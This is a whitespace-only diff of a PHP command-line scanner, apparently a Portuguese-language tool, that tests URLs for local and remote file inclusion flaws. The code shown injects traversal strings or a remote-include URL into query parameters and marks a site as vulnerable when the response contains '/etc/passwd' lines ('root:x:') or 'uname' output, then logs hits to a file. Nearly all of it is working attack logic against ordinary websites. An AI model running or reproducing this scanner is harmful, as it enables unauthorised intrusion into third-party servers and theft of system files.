@@ -41,9 +41,9 @@ error_reporting(0);
 
 $opts = getopt("hd:l:r:i:");
 foreach(array_keys($opts) as $opt) switch($opt) {
-       case "h":
-       help();
-       break;
+          case "h":
+          help();
+          break;
 
 	  case "d":
 	  $dominio = $opts["d"];
@@ -62,7 +62,7 @@ foreach(array_keys($opts) as $opt) switch($opt) {
 	  $valor = strpos($dominio, "=");
 	  $xpt = substr($dominio, 0, $valor);
 	  foreach($passwd as $passwd1) {
-      $domain = $xpt.$passwd1;
+          $domain = $xpt.$passwd1;
 	  for($i=0; $i <=$tr=count($domain)-1; $i++) {
 	  post($domain);
 	          }
@@ -83,13 +83,13 @@ foreach(array_keys($opts) as $opt) switch($opt) {
 	  $x = array_filter(explode("\n", $lista));
 	  foreach($x as $dominio) {
 	  $valor = strpos($dominio, "=");
-      $xpt = substr($dominio, 0, $valor);
+           $xpt = substr($dominio, 0, $valor);
  	  $domain = $xpt. "=".$rfi;
 	  for($i=0; $i <=$tr=count($domain)-1; $i++) {
-      post($domain);
+          post($domain);
                 }
-           }
-    }
+             }
+       }
 
     function post($domain) {
     if(preg_match("@http://@", $domain)){
@@ -109,10 +109,10 @@ foreach(array_keys($opts) as $opt) switch($opt) {
     if(preg_match_all("@root:x:@", $exec) || preg_match_all("@uname@", $exec) ) {
     	echo "Found\n\n";
     	file_put_contents("lfi-rfi.txt", $domain."\r\n", FILE_APPEND);
-    } else {
+     } else {
         echo "Not Found\n\n";
         }
-    }
+     }
      if(isset($opts["d"]) || ($opts["l"]) || ($opts["r"]) || ($opts["i"])) {
    	        echo "Fim!\n";
      } 
